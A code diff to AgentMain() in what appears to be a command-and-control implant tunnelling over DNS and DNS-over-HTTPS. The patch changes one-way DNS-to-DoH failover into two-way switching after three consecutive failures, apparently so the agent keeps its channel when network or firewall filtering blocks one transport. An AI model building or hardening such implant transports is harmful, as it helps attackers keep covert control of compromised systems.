@@ -673,11 +673,12 @@ void AgentMain()
 		return;
 
 	// Decide initial transport: default DNS, "doh" forces DoH, "auto" starts on DNS
-	// and may later fail over to DoH once conditions are met.
+	// and may fail over to DoH and back to DNS based on connectivity.
 	BOOL useDns = TRUE;
 	BOOL autoMode = FALSE;
 	ULONG dnsFailCount = 0;
-	BOOL autoSwitchedToDoh = FALSE;
+	ULONG dohFailCount = 0;
+	const ULONG kFailThreshold = 3;  // consecutive failures to trigger switch
 
 	BYTE* mode = g_Agent->config->profile.mode;
 	if (mode) {
@@ -775,35 +776,47 @@ void AgentMain()
 				useDns = FALSE;
 				autoMode = FALSE;
 				dnsFailCount = 0;
-				autoSwitchedToDoh = FALSE;
+				dohFailCount = 0;
 			} else if (lstrcmpiA((CHAR*)dynMode, "dns") == 0) {
 				useDns = TRUE;
 				autoMode = FALSE;
 				dnsFailCount = 0;
-				autoSwitchedToDoh = FALSE;
+				dohFailCount = 0;
 			} else if (lstrcmpiA((CHAR*)dynMode, "auto") == 0) {
-				// Start from DNS when entering auto mode.
-				useDns = TRUE;
+				// Keep current transport when switching to auto mode
 				autoMode = TRUE;
-				dnsFailCount = 0;
-				autoSwitchedToDoh = FALSE;
+				// Don't reset counters - continue monitoring
 			}
 		}
 
-		// Auto-failover (DNS -> DoH) when in "auto" mode:
-		// Treat connector-level lastQueryOk as our signal. If DNS repeatedly
-		// fails queries (network/WAF), switch once to DoH and stay there.
-		if (autoMode && !autoSwitchedToDoh && useDns) {
+		// Bi-directional auto-failover in "auto" mode:
+		// - DNS fails kFailThreshold times consecutively -> switch to DoH
+		// - DoH fails kFailThreshold times consecutively -> switch back to DNS
+		// This prevents agent from being stuck if one transport becomes unavailable.
+		if (autoMode) {
 			if (TX_LAST_OK()) {
-				// Any successful DNS round resets the failure counter.
-				dnsFailCount = 0;
-			} else {
-				++dnsFailCount;
-				const ULONG kDnsFailThreshold = 3;
-				if (dnsFailCount >= kDnsFailThreshold) {
-					useDns = FALSE;              // switch to DoH
-					autoSwitchedToDoh = TRUE;    // only switch once
+				// Success resets the current transport's failure counter
+				if (useDns) {
 					dnsFailCount = 0;
+				} else {
+					dohFailCount = 0;
+				}
+			} else {
+				// Failure increments the current transport's counter
+				if (useDns) {
+					++dnsFailCount;
+					if (dnsFailCount >= kFailThreshold) {
+						useDns = FALSE;  // switch to DoH
+						dnsFailCount = 0;
+						dohFailCount = 0;  // give DoH a fresh start
+					}
+				} else {
+					++dohFailCount;
+					if (dohFailCount >= kFailThreshold) {
+						useDns = TRUE;   // switch back to DNS
+						dohFailCount = 0;
+						dnsFailCount = 0;  // give DNS a fresh start
+					}
 				}
 			}
 		}
